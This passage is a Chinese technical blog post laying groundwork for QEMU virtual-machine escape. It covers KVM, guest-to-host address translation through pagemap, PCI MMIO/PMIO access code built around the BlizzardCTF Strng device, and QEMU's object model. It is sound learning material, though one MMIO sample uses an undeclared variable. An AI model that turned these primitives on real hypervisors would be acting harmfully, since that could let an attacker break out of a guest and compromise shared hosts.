Machine）是Linux的一个内核驱动模块，让qemu之类的程序直接在host上的CPU安全地执行guest的代码。KVM现在支持x86, ARMv8, ppc, s390和MIPS的CPU。KVM内核模块使用的是Intel或者AMD的硬件虚拟化技术来执行guest的代码。它的作用主要是负责虚拟机的创建，虚拟内存的分配，虚拟CPU寄存器的读写和虚拟cpu的运行。 那么怎么让KVM执行guest上面的代码呢？ 首先qemu进程打开/dev/kvm，之后调用 KVM_RUN ioctl。 假如guest需要访问hardware device register，那就挂起guest的CPU，KVM就会退出，控制权回到qemu进程。 代码如下： 12345678910open(&quot;/dev/kvm&quot;)ioctl(KVM_CREATE_VM)ioctl(KVM_CREATE_VCPU)for (;;) &#123; ioctl(KVM_RUN) switch (exit_reason) &#123; case KVM_EXIT_IO: /* ... */ case KVM_EXIT_HLT: /* ... */ &#125;&#125; 在另一个博客看到一个更详细的 1234567891011121314151617181920212223// 第一步，获取到 KVM 句柄kvmfd = open(&quot;/dev/kvm&quot;, O_RDWR);// 第二步，创建虚拟机，获取到虚拟机句柄。vmfd = ioctl(kvmfd, KVM_CREATE_VM, 0);// 第三步，为虚拟机映射内存，还有其他的 PCI，信号处理的初始化。ioctl(kvmfd, KVM_SET_USER_MEMORY_REGION, &amp;mem);// 第四步，将虚拟机镜像映射到内存，相当于物理机的 boot 过程，把镜像映射到内存。// 第五步，创建 vCPU，并为 vCPU 分配内存空间。ioctl(kvmfd, KVM_CREATE_VCPU, vcpuid);vcpu-&gt;kvm_run_mmap_size = ioctl(kvm-&gt;dev_fd, KVM_GET_VCPU_MMAP_SIZE, 0);// 第五步，创建 vCPU 个数的线程并运行虚拟机。ioctl(kvm-&gt;vcpus-&gt;vcpu_fd, KVM_RUN, 0);// 第六步，线程进入循环，并捕获虚拟机退出原因，做相应的处理。for (;;) &#123; ioctl(KVM_RUN) switch (exit_reason) &#123; case KVM_EXIT_IO: /* ... */ case KVM_EXIT_HLT: /* ... */ &#125;&#125;// 这里的退出并不一定是虚拟机关机，// 虚拟机如果遇到 I/O 操作，访问硬件设备，缺页中断等都会退出执行，// 退出执行可以理解为将 CPU 执行上下文返回到 Qemu。 内存guest虚拟机里面的内存，同样使用的虚拟内存，而guest所使用的物理内存，实际是对应的是启动它的那个qemu的虚拟内存的一部分。 12345678910111213141516171819202122232425 Guest&apos; processes +--------------------+Virtual addr space | | +--------------------+ | | \\__ Page Table \\__ \\ \\ | | Guest kernel +----+--------------------+----------------+Guest&apos;s phy. memory | | | | +----+--------------------+----------------+ | | \\__ \\__ \\ \\ | QEMU process | +----+------------------------------------------+Virtual addr space | | | +----+------------------------------------------+ | | \\__ Page Table \\__ \\ \\ | | +----+-----------------------------------------------++Physical memory | | || +----+-----------------------------------------------++ 比如我们qemu启动了一个2G内存的虚拟机，我们查看内存maps，可以发现有个内存就是2G，就是guest所使用的物理内存 sudo catlink12345678910111213141555dad0b86000-55dad1124000 r-xp 00000000 08:01 665015 /XXXXX/XXXXX/qemu-system-x86_6455dad1323000-55dad13ed000 r--p 0059d000 08:01 665015 /XXXXX/XXXXX/qemu-system-x86_6455dad13ed000-55dad146a000 rw-p 00667000 08:01 665015 /XXXXX/XXXXX/qemu-system-x86_6455dad146a000-55dad18d9000 rw-p 00000000 00:00 0 55dad1f65000-55dad3b83000 rw-p 00000000 00:00 0 [heap]7f1a1c000000-7f1a1c022000 rw-p 00000000 00:00 0 7f1a1c022000-7f1a20000000 ---p 00000000 00:00 0 7f1a20000000-7f1aa0000000 rw-p 00000000 00:00 0 //这个就是2G内存7f1aa0000000-7f1aa07a0000 rw-p 00000000 00:00 0 7f1aa07a0000-7f1aa4000000 ---p 00000000 00:00 0 7f1aa4acb000-7f1aa8000000 rw-p 00000000 00:00 0 7f1aa8000000-7f1aa809e000 rw-p 00000000 00:00 0 .................. 而我们在guest里面申请的虚拟内存可以转化到host的qemu进程中的虚拟内存（相当于guest所认为物理内存） 漏洞利用的时候有些函数需要传递的是物理地址，所以需要将guest中的虚拟地址转化为物理地址。 这有两层转换：1、从guest 的虚拟机地址 to guest 的物理地址2、从 guest 的物理地址 to host的QEMU进程虚拟地址 对于第一层转换，通过pagemap页面映射文件来获取信息进行转换，具体可以参考下面的文档 https://www.kernel.org/doc/Documentation/vm/pagemap.txt 123456789* Bits 0-54 page frame number (PFN) if present* Bits 0-4 swap type if swapped* Bits 5-54 swap offset if swapped* Bit 55 pte is soft-dirty (see Documentation/vm/soft-dirty.txt)* Bit 56 page exclusively mapped (since 4.2)* Bits 57-60 zero* Bit 61 page is file-page or shared-anon (since 3.5)* Bit 62 page swapped* Bit 63 page present 下面的代码来源于http://phrack.org/papers/vm-escape-qemu-case-study.html，而它参考的是https://github.com/nelhage/virtunoid/blob/master/virtunoid.c，我加了点注释 核心的点是：1、虚拟地址的低12位是页内偏移，而高位是物理帧在pagemap文件中的偏移，由于一个地址占用8个字节，所以获取在pagemap文件中的偏移需要乘82、在pagemap读取出来的是满足上面的规则，可以通过bit 63判断页面是否存在3、最后0-54位返回就是物理帧的地址了，再或上低12位的页内偏移，那就是完整的物理地址了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;assert.h&gt;#include &lt;inttypes.h&gt;#define PAGE_SHIFT 12#define PAGE_SIZE (1 &lt;&lt; PAGE_SHIFT)#define PFN_PRESENT (1ull &lt;&lt; 63)#define PFN_PFN ((1ull &lt;&lt; 55) - 1)int fd;// 获取页内偏移uint32_t page_offset(uint32_t addr)&#123; // addr &amp; 0xfff return addr &amp; ((1 &lt;&lt; PAGE_SHIFT) - 1);&#125;uint64_t gva_to_gfn(void *addr)&#123; uint64_t pme, gfn; size_t offset; printf(&quot;pfn_item_offset : %p\\n&quot;, (uintptr_t)addr &gt;&gt; 9); offset = ((uintptr_t)addr &gt;&gt; 9) &amp; ~7; ////下面是网上其他人的代码，只是为了理解上面的代码 //一开始除以 0x1000 （getpagesize=0x1000，4k对齐，而且本来低12位就是页内索引，需要去掉），即除以2**12, 这就获取了页号了， //pagemap中一个地址64位，即8字节，也即sizeof(uint64_t)，所以有了页号后，我们需要乘以8去找到对应的偏移从而获得对应的物理地址 //最终 vir/2^12 * 8 = (vir / 2^9) &amp; ~7 //这跟上面的右移9正好对应，但是为什么要 &amp; ~7 ,因为你 vir &gt;&gt; 12 &lt;&lt; 3 , 跟vir &gt;&gt; 9 是有区别的，vir &gt;&gt; 12 &lt;&lt; 3低3位肯定是0，所以通过&amp; ~7将低3位置0 // int page_size=getpagesize(); // unsigned long vir_page_idx = vir/page_size; // unsigned long pfn_item_offset = vir_page_idx*sizeof(uint64_t); lseek(fd, offset, SEEK_SET); read(fd, &amp;pme, 8); // 确保页面存在——page is present. if (!(pme &amp; PFN_PRESENT)) return -1; // physical frame number gfn = pme &amp; PFN_PFN; return gfn;&#125;uint64_t gva_to_gpa(void *addr)&#123; uint64_t gfn = gva_to_gfn(addr); assert(gfn != -1); return (gfn &lt;&lt; PAGE_SHIFT) | page_offset((uint64_t)addr);&#125;int main()&#123; uint8_t *ptr; uint64_t ptr_mem; fd = open(&quot;/proc/self/pagemap&quot;, O_RDONLY); if (fd &lt; 0) &#123; perror(&quot;open&quot;); exit(1); &#125; ptr = malloc(256); strcpy(ptr, &quot;Where am I?&quot;); printf(&quot;%s\\n&quot;, ptr); ptr_mem = gva_to_gpa(ptr); printf(&quot;Your physical address is at 0x%&quot;PRIx64&quot;\\n&quot;, ptr_mem); getchar(); return 0;&#125; 将上面这个代码编译后，放到qemu运行（root权限） 之后我们在主机gdb attach到qemu的pid（root权限） 查看分配给qemu虚拟机对应的内存，我们分配的是2G，所以大小是0x8000000 123456789101112131415161718192021gdb-peda$ info proc mappingsprocess 2776Mapped address spaces: Start Addr End Addr Size Offset objfile 0x56154915f000 0x5615497a2000 0x643000 0x0 /XXXXXXXXXX/qemu/bin/debug/native/x86_64-softmmu/qemu-system-x86_64 0x5615499a1000 0x561549a71000 0xd0000 0x642000 /XXXXXXXXXX/qemu/bin/debug/native/x86_64-softmmu/qemu-system-x86_64 0x561549a71000 0x561549af7000 0x86000 0x712000 /XXXXXXXXXX/qemu/bin/debug/native/x86_64-softmmu/qemu-system-x86_64 0x561549af7000 0x561549f87000 0x490000 0x0 0x56154b0fc000 0x56154cd14000 0x1c18000 0x0 [heap] 0x7fcdd4000000 0x7fcdd40b8000 0xb8000 0x0 0x7fcdd40b8000 0x7fcdd8000000 0x3f48000 0x0 0x7fcdd86c9000 0x7fcddbe00000 0x3737000 0x0 0x7fcddbe00000 0x7fcddbe01000 0x1000 0x0 0x7fcddbeff000 0x7fcddc000000 0x101000 0x0 0x7fcddc000000 0x7fce5c000000 0x80000000 0x0 &lt;=========就这个 0x7fce5c000000 0x7fce5c883000 0x883000 0x0 0x7fce5c883000 0x7fce60000000 0x377d000 0x0 。。。。。。 。。。。。。 。。。。。。 确实可以在qemu的进程的虚拟地址看到我们字符串 PCI设备PCI是一个外部链接（Peripheral Component Interconnect）标准，PCI设备就是符合这个标准的设备，且连接到PCI总线上。而PCI总线是CPU与外部设备沟通的桥梁。 每个PCI设备对应备一个PCI配置空间(PCI Configuration Space)，它记录了关于此设备的信息。PCI配置空间最大256个字节，其中前64字节都是预定义好的标准。 我们可以看下面的图，我copy过来了两张，其实都是一样的，不过第一张对于Base Address Registers更加细致。 具体的数据结构如下（复制于一个文章，暂时没在qemu源码找到，不确定是否准确，仅供参考）： 1234567891011121314151617181920212223typedef struct &#123; WORD wBusNum; // Bus No. input field WORD wDeviceNum; // Device No. input field WORD wFunction; // Function No. input field WORD wVendorId; // Vendor ID input field WORD wDeviceId; // Device ID input field WORD wDeviceIndex; // Device Search No. input field WORD wCommand; // Command WORD wClassId; // Class ID BYTE byInterfaceId; // Interface ID BYTE byRevId; // Revision ID BYTE byCLS; // Cache Line Size BYTE byLatency; // Latency Timer DWORD dwBaseAddr[6]; // Base Address Register DWORD dwCIS; WORD wSubSystemVendorId; WORD wSubSystemId; DWORD dwRomBaseAddr; // Extension ROM Base Address BYTE byIntLine; // Interrupt Line BYTE byIntPin; // Interrupt Pin BYTE byMaxLatency; // Max Latency BYTE byMinGrant; // Min Grant &#125; PCIDEV, *LPPCIDEV; 前面就是一些制造商ID，设备ID，等信息. 比较重要的就是那6个Base Address Registers，简称BAR。当然不是必须要有6个BAR。每个BAR记录了该设备映射的一段地址空间，映射的地址空间有Memory 空间和 I/O 空间。 Memory 空间和 I/O 空间的区别是最低位，Memory 空间最低位是0， I/O 空间的最低位是1 若是Memory 空间，1-2位表示内存的类型（type），bit 2为1表示采用64位地址，为0表示采用32位地址。bit1为1表示区间大小超过1M，为0表示不超过1M。bit3表示是否支持可预读取（Prefetchable）。 比如下面的设备，第一个是Memory 空间，第二个是 I/O 空间，看到最后一列，0x0000000000040200的最低bit是0，而0x0000000000040101的最低bit是1（前两列是空间的其实地址，第一个Memory 空间是0xfebf1000到0xfebf10ff，而第二个I/O ports是从0xc050到0xc057共8个端口） 1234567891011121314ubuntu@ubuntu:~$ cat /sys/devices/pci0000\\:00/0000\\:00\\:03.0/resource0x00000000febf1000 0x00000000febf10ff 0x00000000000402000x000000000000c050 0x000000000000c057 0x00000000000401010x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x0000000000000000 其实上面说Memory 空间和I/O 空间分别对应我们常见到的MMIO，PMIO 12内存映射I/O （Memory-mapped I/O —— MMIO）端口映射I/O （port-mapped I/O —— PMIO） 通过Memory 空间访问设备I/O的方式称为memory mapped I/O，即MMIO，这种情况下，CPU直接使用普通访存指令即可访问设备I/O。通过I/O 空间访问设备I/O的方式称为port mapped I/O，即PMIO，这种情况下CPU需要使用专门的I/O指令如IN/OUT访问I/O端口。 MMIO，PMIO是PC机在中央处理器（CPU）和外部设备之间执行输入输出操作的两种方法，这两种方法互为补充。 查看PCI设备的信息以BlizzardCTF 2017 Strng为例 查看当前虚拟机的pci设备 12345678ubuntu@ubuntu:~$ lspci00:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC [Natoma] (rev 02)00:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA [Natoma/Triton II]00:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE [Natoma/Triton II]00:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI (rev 03)00:02.0 VGA compatible controller: Device 1234:1111 (rev 02)00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10)00:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller (rev 03) -v可以查看更加详细信息，看到内存是0xfebf1000的256字节大小的，PMIO端口是0xc050开始的8个端口号 1234567891011ubuntu@ubuntu:~$ lspci -v......00:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10) Subsystem: Red Hat, Inc Device 1100 Physical Slot: 3 Flags: fast devsel Memory at febf1000 (32-bit, non-prefetchable) [size=256] I/O ports at c050 [size=8] ...... 上面设备过多可能不太友好，可用-s指定 1234567ubuntu@ubuntu:~$ lspci -v -s 00:03.000:03.0 Unclassified device [00ff]: Device 1234:11e9 (rev 10) Subsystem: Red Hat, Inc Device 1100 Physical Slot: 3 Flags: fast devsel Memory at febf1000 (32-bit, non-prefetchable) [size=256] I/O ports at c050 [size=8] 查看header的一些具体的值 123456789ubuntu@ubuntu:~$ lspci -v -m -n -s 00:03.0Device: 00:03.0Class: 00ffVendor: 1234Device: 11e9SVendor: 1af4SDevice: 1100PhySlot: 3Rev: 10 我们在文件系统中也可以看到这个设备的文件（linux一切皆文件） 1234567891011121314151617181920212223242526272829ubuntu@ubuntu:~$ ll /sys/devices/pci0000\\:00/0000:00:03.0/total 0drwxr-xr-x 3 root root 0 Nov 18 03:30 ./drwxr-xr-x 11 root root 0 Nov 18 03:30 ../-rw-r--r-- 1 root root 4096 Nov 18 03:52 broken_parity_status-r--r--r-- 1 root root 4096 Nov 18 03:38 class-rw-r--r-- 1 root root 256 Nov 18 03:38 config-r--r--r-- 1 root root 4096 Nov 18 03:52 consistent_dma_mask_bits-rw-r--r-- 1 root root 4096 Nov 18 03:52 d3cold_allowed-r--r--r-- 1 root root 4096 Nov 18 03:38 device-r--r--r-- 1 root root 4096 Nov 18 03:52 dma_mask_bits-rw-r--r-- 1 root root 4096 Nov 18 03:52 enablelrwxrwxrwx 1 root root 0 Nov 18 03:52 firmware_node -&gt; ../../LNXSYSTM:00/device:00/PNP0A03:00/device:06/-r--r--r-- 1 root root 4096 Nov 18 03:31 irq-r--r--r-- 1 root root 4096 Nov 18 03:52 local_cpulist-r--r--r-- 1 root root 4096 Nov 18 03:52 local_cpus-r--r--r-- 1 root root 4096 Nov 18 03:52 modalias-rw-r--r-- 1 root root 4096 Nov 18 03:52 msi_busdrwxr-xr-x 2 root root 0 Nov 18 03:52 power/--w--w---- 1 root root 4096 Nov 18 03:52 remove--w--w---- 1 root root 4096 Nov 18 03:52 rescan-r--r--r-- 1 root root 4096 Nov 18 03:38 resource-rw------- 1 root root 256 Nov 18 03:52 resource0-rw------- 1 root root 8 Nov 18 03:52 resource1lrwxrwxrwx 1 root root 0 Nov 18 03:52 subsystem -&gt; ../../../bus/pci/-r--r--r-- 1 root root 4096 Nov 18 03:52 subsystem_device-r--r--r-- 1 root root 4096 Nov 18 03:52 subsystem_vendor-rw-r--r-- 1 root root 4096 Nov 18 03:30 uevent-r--r--r-- 1 root root 4096 Nov 18 03:38 vendor 查看设备id是device文件 12ubuntu@ubuntu:~$ cat /sys/devices/pci0000\\:00/0000\\:00\\:03.0/device0x11e9 查看MMIO，PMIO映射可以看resource（三列分别是开始地址 结束地址 标志），第一行是MMIO，第二行是PMIO（有时候lspci -v看不到信息的时候可以通过resource文件查看） 1234567891011121314ubuntu@ubuntu:~$ cat /sys/devices/pci0000\\:00/0000:00:03.0/resource0x00000000febf1000 0x00000000febf10ff 0x00000000000402000x000000000000c050 0x000000000000c057 0x00000000000401010x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x00000000000000000x0000000000000000 0x0000000000000000 0x0000000000000000 查看ioports（有些虚拟机查看不到） 12345678910111213141516171819202122232425262728293031323334353637# cat /proc/ioports0000-0cf7 : PCI Bus 0000:00 0000-001f : dma1 0020-0021 : pic1 0040-0043 : timer0 0050-0053 : timer1 0060-0060 : keyboard 0064-0064 : keyboard 0070-0071 : rtc0 0080-008f : dma page reg 00a0-00a1 : pic2 00c0-00df : dma2 00f0-00ff : fpu 0170-0177 : 0000:00:01.1 0170-0177 : ata_piix 01f0-01f7 : 0000:00:01.1 01f0-01f7 : ata_piix 0376-0376 : 0000:00:01.1 0376-0376 : ata_piix 03c0-03df : vga+ 03f6-03f6 : 0000:00:01.1 03f6-03f6 : ata_piix 03f8-03ff : serial 0510-051b : QEMU0002:00[ 9.062032] random: fast init done 0600-063f : 0000:00:01.3 0600-0603 : ACPI PM1a_EVT_BLK 0604-0605 : ACPI PM1a_CNT_BLK 0608-060b : ACPI PM_TMR 0700-070f : 0000:00:01.30cf8-0cff : PCI conf10d00-ffff : PCI Bus 0000:00 afe0-afe3 : ACPI GPE0_BLK c000-c03f : 0000:00:03.0 c000-c03f : e1000 c040-c04f : 0000:00:01.1 c040-c04f : ata_piix 访问PCI设备配置空间中的Memory 空间和 I/O 空间PMIO端口的编址是独立于系统的地址空间，其实就是一段地址区域，所有外设的地址都映射到这段区域中。 MMIO是直接把寄存器的地址空间直接映射到系统地址空间，系统地址空间往往会保留一段内存区用于这种MMIO的映射（当然肯定是位于系统内存区），这样系统可以直接使用普通的访存指令直接访问设备的寄存器，随着计算机内存容量的日益增大，这种方式更是显出独特的优势，在性能至上的理念下，使用MMIO可以最大限度满足日益增长的系统和外设存储的需要。所以当前其实大多数外设都是采用MMIO的方式。 MMIOMMIO示例代码：通过映射resource0文件实现对Memory 空间的访问 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;#include &lt;string.h&gt;#include &lt;errno.h&gt;#include &lt;signal.h&gt;#include &lt;fcntl.h&gt;#include &lt;ctype.h&gt;#include &lt;termios.h&gt;#include &lt;assert.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/mman.h&gt;#include &lt;sys/io.h&gt;#define MAP_SIZE 4096UL#define MAP_MASK (MAP_SIZE - 1)char* pci_device_name = &quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;;unsigned char* mmio_base;unsigned char* getMMIOBase()&#123; int fd; if((fd = open(pci_device_name, O_RDWR | O_SYNC)) == -1) &#123; perror(&quot;open pci device&quot;); exit(-1); &#125; mmio_base = mmap(0, MAP_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0); if(mmio_base == (void *) -1) &#123; perror(&quot;mmap&quot;); exit(-1); &#125; return mmio_base;&#125;void mmio_write(uint64_t addr, uint64_t value)&#123; *((uint64_t*)(mmio_base + addr)) = value;&#125;uint64_t mmio_read(uint64_t addr)&#123; return *((uint64_t*)(mmio_base + addr));&#125;int main(int argc, char const *argv[])&#123; getMMIOBase(); printf(&quot;mmio_base Resource0Base: %p\\n&quot;, mmio_base); mmio_write(144, val); mmio_read(144); return 0;&#125; 据说还可以这样，但是这个在用户空间好像不行，应该是只能编写内核模块，即驱动才能用 1234567891011121314#include &lt;asm/io.h&gt;#include &lt;linux/ioport.h&gt;long addr=ioremap(ioaddr,iomemsize);readb(addr);readw(addr);readl(addr);readq(addr);//qwords=8 btyeswriteb(val,addr);writew(val,addr);writel(val,addr);writeq(val,addr);iounmap(addr); PMIO需要权限才能访问端口，0x000-0x3ff可以用ioperm(from, num, turn_on) 比如ioperm(0x300,5,1); 获得 0x300 到 0x304 端口的访问权限 但是更高的端口就要用iopl(3)来获得权限，这个可以获得范围所有端口权限。当然我们需要root用户来运行程序才行。 in,out系列函数如下，分别是写入/读取一个字节（b结尾），两个字节（w结尾），四个字节（l结尾） 12345678910#include &lt;sys/io.h &gt;iopl(3); inb(port); inw(port); inl(port);outb(val,port); outw(val,port); outl(val,port); 当然调试的时候可以通过dd来触发PMIO 比如用dd命令向0xc050端口写入666吧，echo会自动加上换行，所以实际写入的是666加上换行 12ubuntu@ubuntu:~$ echo 666 &gt; testubuntu@ubuntu:~$ sudo dd if=test of=/sys/devices/pci0000\\:00/0000\\:00\\:03.0/resource1 bs=4 count=1 QEMU中的对象模型QEMU提供了一套面向对象编程的模型——QOM，即QEMU Object Module，几乎所有的设备如CPU、内存、总线等都是利用这一面向对象的模型来实现的。 而对象的初始化分为四步： 将 TypeInfo 注册 TypeImpl 实例化 ObjectClass 实例化 Object 添加 Property QOM模型的实现代码位于qom/文件夹下的文件中，这涉及了几个结构TypeImpl, ObjectClass, Object和TypeInfo。看了下它们的定义都在https://github.com/qemu/qemu/blob/master/include/qom/object.h可以找到，只有TypeImpl的具体结构是在https://github.com/qemu/qemu/blob/master/qom/object.c中。 ObjectClass: 是所有类对象的基类，仅仅保存了一个整数 type 。Object: 是所有对象的 基类Base Object ， 第一个成员变量为指向 ObjectClass 的指针。TypeInfo：是用户用来定义一个 Type 的工具型的数据结构。TypeImpl：对数据类型的抽象数据结构，TypeInfo的属性与TypeImpl的属性对应。 将 TypeInfo 注册 TypeImpl下面是TypeInfo 12345678910111213141516171819struct TypeInfo&#123; const char *name; const char *parent; size_t instance_size; void (*instance_init)(Object *obj); void (*instance_post_init)(Object *obj); void (*instance_finalize)(Object *obj); bool abstract; size_t class_size; void (*class_init)(ObjectClass *klass, void *data); void (*class_base_init)(ObjectClass *klass, void *data); void *class_data; InterfaceInfo *interfaces;&#125;; 2018年12月更新，删除了class_finalize函数 https://github.com/qemu/qemu/commit/37fdb2c56c603378b85466d1dd64fb4c95f9deb7 注释对于里面的成员写得比较详细了 1234567891011121314151617181920212223242526272829303132333435363738/** * TypeInfo: * @name: The name of the type. * @parent: The name of the parent type. * @instance_size: The size of the object (derivative of #Object). If * @instance_size is 0, then the size of the object will be the size of the * parent object. * @instance_init: This function is called to initialize an object. The parent * class will have already been initialized so the type is only responsible * for initializing its own members. * @instance_post_init: This function is called to finish initialization of * an object, after all @instance_init functions were called. * @instance_finalize: This function is called during object destruction. This * is called before the parent @instance_finalize function has been called. * An object should only free the members that are unique to its type in this * function. * @abstract: If this field is true, then the class is considered abstract and * cannot be directly instantiated. * @class_size: The size of the class object (derivative of #ObjectClass) * for this object. If @class_size is 0, then the size of the class will be * assumed to be the size of the parent class. This allows a type to avoid * implementing an explicit class type if they are not adding additional * virtual functions. * @class_init: This function is called after all parent class initialization * has occurred to allow a class to set its default virtual method pointers. * This is also the function to use to override virtual methods from a parent * class. * @class_base_init: This function is called for all base classes after all * parent class initialization has occurred, but before the class itself * is initialized. This is the function to use to undo the effects of * memcpy from the parent class to the descendants. * @class_data: Data to pass to the @class_init, * @class_base_init. This can be useful when building dynamic * classes. * @interfaces: The list of interfaces associated with this type. This * should point to a static array that&apos;s terminated with a zero filled * element. */ 其实包含了下面信息 Name 包括自己的Name，Parent的Name。 Class（针对ObjectClass） ObjectClass的信息包括，class_size，class_data，class相关函数：class_base_init，class_init，class_finalize。 这些函数都是为了初始化，释放结构体ObjectClass。 Instance（针对的是Object） 对象Object信息包括：instance_size，instance相关函数：instance_post_init，instance_init，instance_finalize。 这些函数都是为了初始化，释放结构体Object。 其他信息 abstract是否为抽象。interface数组。 一般是定义一个TypeInfo，然后调用 type_register(TypeInfo) 或者 type_register_static(TypeInfo) 函数（我看到的基本都是type_register_static比较多），就会生成相应的TypeImpl实例，将这个TypeInfo注册到全局的TypeImpl的hash表中。TypeInfo的属性与TypeImpl的属性对应，实际上qemu就是通过用户提供的TypeInfo创建的TypeImpl的对象。 我们看看https://github.com/qemu/qemu/blob/master/include/qom/object.h里面的注释，看看怎么定义一个TypeInfo， 12345678910111213141516171819202122232425262728293031* &lt;example&gt;* &lt;title&gt;Creating a minimal type&lt;/title&gt;* &lt;programlisting&gt;* #include &quot;qdev.h&quot;** #define TYPE_MY_DEVICE &quot;my-device&quot;** // No new virtual functions: we can reuse the typedef for the* // superclass.* typedef DeviceClass MyDeviceClass;* typedef struct MyDevice* &#123;* DeviceState parent;** int reg0, reg1, reg2;* &#125; MyDevice;** static const TypeInfo my_device_info = &#123;* .name = TYPE_MY_DEVICE,* .parent = TYPE_DEVICE,* .instance_size = sizeof(MyDevice),* &#125;;** static void my_device_register_types(void)* &#123;* type_register_static(&amp;my_device_info);* &#125;** type_init(my_device_register_types)* &lt;/programlisting&gt;* &lt;/example&gt; 或者我们去源码找一个实际的硬件https://github.com/qemu/qemu/blob/1c5880e785807abcc715a7ee216706e02c1af689/hw/pci/pci.c#L2801 1234567891011121314151617181920static const TypeInfo pci_device_type_info = &#123; .name = TYPE_PCI_DEVICE, .parent = TYPE_DEVICE, .instance_size = sizeof(PCIDevice), .abstract = true, .class_size = sizeof(PCIDeviceClass), .class_init = pci_device_class_init, .class_base_init = pci_device_class_base_init,&#125;;static void pci_register_types(void)&#123; type_register_static(&amp;pci_bus_info); type_register_static(&amp;pcie_bus_info); type_register_static(&amp;conventional_pci_interface_info); type_register_static(&amp;pcie_interface_info); type_register_static(&amp;pci_device_type_info);&#125;type_init(pci_register_types) 可以看到定义的时候不一定要初始化所有的成员， type_init接收用户写好的XXX_register_types（里面使用type_register_static生成相应的TypeImpl实例） 跟随type_register_static函数去看看 12345678910111213141516171819static TypeImpl *type_register_internal(const TypeInfo *info)&#123; TypeImpl *ti; ti = type_new(info); type_table_add(ti); return ti;&#125;TypeImpl *type_register(const TypeInfo *info)&#123; assert(info-&gt;parent); return type_register_internal(info);&#125;TypeImpl *type_register_static(const TypeInfo *info)&#123; return type_register(info);&#125; 可以看到最终进入type_register_internal，type_new就是将TypeInfo的信息传递给TypeImpl 1234567891011121314151617181920212223242526272829303132333435static TypeImpl *type_new(const TypeInfo *info)&#123; TypeImpl *ti = g_malloc0(sizeof(*ti)); int i; g_assert(info-&gt;name != NULL); if (type_table_lookup(info-&gt;name) != NULL) &#123; fprintf(stderr, &quot;Registering `%s&apos; which already exists\\n&quot;, info-&gt;name); abort(); &#125; ti-&gt;name = g_strdup(info-&gt;name); ti-&gt;parent = g_strdup(info-&gt;parent); ti-&gt;class_size = info-&gt;class_size; ti-&gt;instance_size = info-&gt;instance_size; ti-&gt;class_init = info-&gt;class_init; ti-&gt;class_base_init = info-&gt;class_base_init; ti-&gt;class_data = info-&gt;class_data; ti-&gt;instance_init = info-&gt;instance_init; ti-&gt;instance_post_init = info-&gt;instance_post_init; ti-&gt;instance_finalize = info-&gt;instance_finalize; ti-&gt;abstract = info-&gt;abstract; for (i = 0; info-&gt;interfaces &amp;&amp; info-&gt;interfaces[i].type; i++) &#123; ti-&gt;interfaces[i].typename = g_strdup(info-&gt;interfaces[i].type); &#125; ti-&gt;num_interfaces = i; return ti;&#125; 之后的type_table_add就是将TypeImpl插入到一个哈希表 123456789101112131415161718static GHashTable *type_table_get(void)&#123; static GHashTable *type_table; if (type_table == NULL) &#123; type_table = g_hash_table_new(g_str_hash, g_str_equal); &#125; return type_table;&#125;static bool enumerating_types;static void type_table_add(TypeImpl *ti)&#123; assert(!enumerating_types); g_hash_table_insert(type_table_get(), (void *)ti-&gt;name, ti);&#125; 上面的g_hash_table_insert是glib库中的函数，定义如下： 1234gbooleang_hash_table_insert (GHashTable *hash_table, gpointer key, gpointer value); 首先第一个参数通过type_table_get()中的g_hash_table_new创建一个GHashTable，第二、三个参数就是key和value了，这里分别是name还有TypeImpl。 有了一个TypeImpl的哈希表，下一步就是初始化每个type了，这一步可以看成是class的初始化，可以理解成每一个type对应了一个class，接下来会初始化class。 我们回到type_init，这实际是个宏，代码在https://github.com/qemu/qemu/blob/bb9bf94b3e8926553290bc9a7cb84315af422086/include/qemu/module.h#L21，看着跟linux的驱动有点像的感觉，当肯定不是一回事，可以看到do_qemu_init_ ## function(void)前面有__attribute__((constructor))关键字，这个可以让函数在main函数之前执行！！！。 123456789101112131415161718192021222324252627282930313233#ifdef BUILD_DSOvoid DSO_STAMP_FUN(void);/* This is a dummy symbol to identify a loaded DSO as a QEMU module, so we can * distinguish &quot;version mismatch&quot; from &quot;not a QEMU module&quot;, when the stamp * check fails during module loading */void qemu_module_dummy(void);#define module_init(function, type) \\static void __attribute__((constructor)) do_qemu_init_ ## function(void) \\&#123; \\ register_dso_module_init(function, type); \\&#125;#else/* This should not be used directly. Use block_init etc. instead. */#define module_init(function, type) \\static void __attribute__((constructor)) do_qemu_init_ ## function(void) \\&#123; \\ register_module_init(function, type); \\&#125;#endiftypedef enum &#123; MODULE_INIT_BLOCK, MODULE_INIT_OPTS, MODULE_INIT_QOM, 